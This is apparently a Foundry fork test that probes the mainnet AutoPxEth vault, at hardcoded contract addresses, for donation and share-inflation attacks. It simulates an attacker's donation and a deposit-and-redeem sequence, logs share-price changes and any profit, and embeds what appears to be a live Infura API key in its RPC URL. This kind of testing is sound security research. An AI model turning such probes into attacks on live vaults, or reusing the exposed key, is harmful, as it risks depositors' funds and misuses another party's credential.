// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title AutoPxEth Exploit Attempt
 * @notice Test donation attack on low-supply AutoPxEth vault
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IAutoPxEth {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function previewDeposit(uint256 assets) external view returns (uint256);
    function previewRedeem(uint256 shares) external view returns (uint256);
    function asset() external view returns (address);
}

interface IPirexEth {
    function deposit(address receiver, bool shouldCompound) external payable returns (uint256, uint256);
}

contract AutoPxEthExploit is Test {
    address constant AUTO_PXETH = 0x9Ba021B0a9b958B5E75cE9f6dff97C7eE52cb3E6;
    address constant PXETH = 0x04C154b66CB340F3Ae24111CC767e0184Ed00Cc6;
    address constant PIREX_ETH = 0xD664b74274DfEB538d9baC494F3a4760828B02b0;

    address attacker;
    address victim;

    string constant RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
    }

    /**
     * @notice Detailed analysis of AutoPxEth state
     */
    function test_DetailedState() public view {
        console.log("=== AutoPxEth Detailed State ===\n");

        IAutoPxEth vault = IAutoPxEth(AUTO_PXETH);
        IERC20 pxeth = IERC20(PXETH);

        uint256 totalAssets = vault.totalAssets();
        uint256 totalSupply = vault.totalSupply();
        uint256 pxethBalance = pxeth.balanceOf(AUTO_PXETH);
        uint256 pxethTotalSupply = pxeth.totalSupply();

        console.log("Vault Metrics:");
        console.log("  totalSupply (shares):", totalSupply);
        console.log("  totalAssets:", totalAssets);
        console.log("  pxETH balance:", pxethBalance);
        console.log("  pxETH total supply:", pxethTotalSupply);

        if (totalSupply > 0) {
            uint256 sharePrice = totalAssets * 1e18 / totalSupply;
            console.log("\n  Share price (1 share = X assets):", sharePrice);
            console.log("  (Normal is 1e18 = 1:1)");

            // Simulate deposit roundtrip
            uint256 depositAmount = 1e18;
            uint256 sharesForDeposit = vault.previewDeposit(depositAmount);
            uint256 assetsBack = vault.previewRedeem(sharesForDeposit);
            uint256 loss = depositAmount > assetsBack ? depositAmount - assetsBack : 0;

            console.log("\n  Roundtrip test (deposit 1e18):");
            console.log("    Shares received:", sharesForDeposit);
            console.log("    Assets back on redeem:", assetsBack);
            console.log("    Loss:", loss);
            console.log("    Loss %:", loss * 10000 / depositAmount);  // basis points
        }
    }

    /**
     * @notice Simulate donation attack to see impact
     */
    function test_DonationImpact() public {
        console.log("=== Donation Attack Simulation ===\n");

        IAutoPxEth vault = IAutoPxEth(AUTO_PXETH);
        IERC20 pxeth = IERC20(PXETH);

        uint256 totalAssetsBefore = vault.totalAssets();
        uint256 totalSupply = vault.totalSupply();

        console.log("Before Donation:");
        console.log("  Total Assets:", totalAssetsBefore / 1e18, "pxETH");
        console.log("  Total Supply:", totalSupply / 1e18, "shares");

        // Get pxETH for attacker via Pirex deposit
        vm.deal(attacker, 100 ether);

        vm.startPrank(attacker);
        // Deposit ETH to get pxETH
        (uint256 pxAmount,) = IPirexEth(PIREX_ETH).deposit{value: 10 ether}(attacker, false);
        console.log("\n  Attacker obtained:", pxAmount / 1e18, "pxETH");

        // Calculate share price before donation
        uint256 sharePriceBefore = totalAssetsBefore * 1e18 / totalSupply;

        // Donate to vault (direct transfer)
        uint256 donationAmount = pxAmount;
        pxeth.transfer(AUTO_PXETH, donationAmount);
        vm.stopPrank();

        // Check impact
        uint256 totalAssetsAfter = vault.totalAssets();
        console.log("\nAfter Donation:");
        console.log("  Total Assets:", totalAssetsAfter / 1e18, "pxETH");

        // Note: totalAssets may or may not increase depending on implementation
        // If it uses balanceOf, it will increase. If it tracks internally, it won't.

        if (totalAssetsAfter > totalAssetsBefore) {
            uint256 sharePriceAfter = totalAssetsAfter * 1e18 / totalSupply;
            console.log("\n  Share price changed!");
            console.log("    Before:", sharePriceBefore);
            console.log("    After:", sharePriceAfter);
            console.log("    Increase:", (sharePriceAfter - sharePriceBefore) * 100 / sharePriceBefore, "%");

            // This means donation attack could work!
            if (sharePriceAfter > sharePriceBefore) {
                console.log("\n  !!! DONATION AFFECTS SHARE PRICE !!!");
                console.log("  Potential attack vector identified");
            }
        } else {
            console.log("\n  Donation did NOT affect totalAssets");
            console.log("  Vault uses internal accounting (protected)");
        }
    }

    /**
     * @notice Attempt actual exploitation
     */
    function test_ExploitAttempt() public {
        console.log("=== Exploit Attempt ===\n");

        IAutoPxEth vault = IAutoPxEth(AUTO_PXETH);
        IERC20 pxeth = IERC20(PXETH);

        // Record initial state
        uint256 initialSupply = vault.totalSupply();
        uint256 initialAssets = vault.totalAssets();

        console.log("Initial State:");
        console.log("  Supply:", initialSupply);
        console.log("  Assets:", initialAssets);

        // Attack setup: Get pxETH
        vm.deal(attacker, 20 ether);
        vm.deal(victim, 10 ether);

        // Step 1: Attacker deposits first to get shares
        vm.startPrank(attacker);
        (uint256 attackerPxEth,) = IPirexEth(PIREX_ETH).deposit{value: 10 ether}(attacker, false);
        console.log("\nAttacker obtained:", attackerPxEth / 1e18, "pxETH");

        // Deposit to get shares
        pxeth.approve(AUTO_PXETH, attackerPxEth);
        uint256 attackerShares = vault.deposit(attackerPxEth, attacker);
        console.log("Attacker shares:", attackerShares);
        vm.stopPrank();

        // Step 2: Victim deposits
        vm.startPrank(victim);
        (uint256 victimPxEth,) = IPirexEth(PIREX_ETH).deposit{value: 5 ether}(victim, false);
        console.log("\nVictim obtained:", victimPxEth / 1e18, "pxETH");

        pxeth.approve(AUTO_PXETH, victimPxEth);
        uint256 victimShares = vault.deposit(victimPxEth, victim);
        console.log("Victim shares:", victimShares);
        vm.stopPrank();

        // Step 3: Attacker redeems
        vm.startPrank(attacker);
        uint256 attackerRedeemed = vault.redeem(attackerShares, attacker, attacker);
        console.log("\nAttacker redeemed:", attackerRedeemed / 1e18, "pxETH");
        vm.stopPrank();

        // Calculate profit/loss
        int256 attackerPnL = int256(attackerRedeemed) - int256(attackerPxEth);
        console.log("\nAttacker P&L:", attackerPnL);

        if (attackerPnL > 0) {
            console.log("!!! PROFIT EXTRACTED !!!");
            console.log("Exploit successful!");
        } else {
            console.log("No profit - attack failed");
        }
    }

    /**
     * @notice Check if vault is vulnerable to inflation attack
     */
    function test_InflationVulnerability() public view {
        console.log("=== Inflation Vulnerability Check ===\n");

        IAutoPxEth vault = IAutoPxEth(AUTO_PXETH);

        uint256 totalSupply = vault.totalSupply();
        uint256 totalAssets = vault.totalAssets();

        // Check decimals offset protection
        // ERC4626 can have virtual shares to prevent inflation attacks

        // With 3900 shares and 4306 assets, ratio is ~1.1
        // This is normal yield accumulation

        console.log("Current State:");
        console.log("  Shares:", totalSupply);
        console.log("  Assets:", totalAssets);
        console.log("  Ratio:", totalAssets * 1000 / totalSupply);

        // Calculate minimum deposit to get 1 share
        uint256 minDeposit = vault.previewDeposit(1);
        console.log("\n  Min deposit for 1 share:", minDeposit);

        // If minDeposit is very high relative to 1 wei, vault is vulnerable
        if (minDeposit > 1e15) {
            console.log("  HIGH minimum deposit - potential vulnerability");
        } else {
            console.log("  Normal minimum deposit");
        }

        // Check 1 wei deposit
        uint256 sharesFor1Wei = vault.convertToShares(1);
        console.log("\n  Shares for 1 wei:", sharesFor1Wei);

        uint256 assetsFor1Share = vault.convertToAssets(1);
        console.log("  Assets for 1 share:", assetsFor1Share);
    }
}
